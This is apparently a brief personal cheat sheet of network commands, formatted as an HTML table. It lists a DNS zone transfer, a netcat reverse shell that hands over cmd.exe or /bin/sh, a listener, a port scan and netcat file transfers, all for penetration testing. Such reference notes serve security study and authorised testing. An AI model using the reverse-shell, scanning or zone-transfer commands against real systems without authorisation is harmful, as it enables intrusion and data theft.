# rtfm

## network

<table>
  <tr>
    <th>command</th>
	<th>description</th>
  </tr>
  <tr>
    <td>host -t ns <i>domain</i></td>
    <td>ask the name servers for a domain</td>
  </tr>
  <tr>
	<td>host -l <i>domain nameServer</td>
	<td>dns zone transfer</td>
  </tr>
  <tr>
	<td>nc <i>ip port</i> -e <i>shell</td>
	<td>start reverse shell: cmd.exe, /bin/sh</td>
  </tr>
  <tr>
	<td>nc -l -p <i>port</td>
	<td>start listener</td>
  </tr>
  <tr>
	<td>nc -v -n -z -w1 <i>ip startPort</i> - <i>endPort</td>
	<td>tcp port scanner</td> 
  </tr>
  <tr>
	<td>nc -l -p <i>port fileName</i><br>nc -w3 <i>ip port fileName</td>
	<td>file transfers</td>
  </tr>
</table>
<!--stackedit_data:
eyJoaXN0b3J5IjpbMTc3MTg5MTQxMywtMTk2NjU4ODUxNV19
-->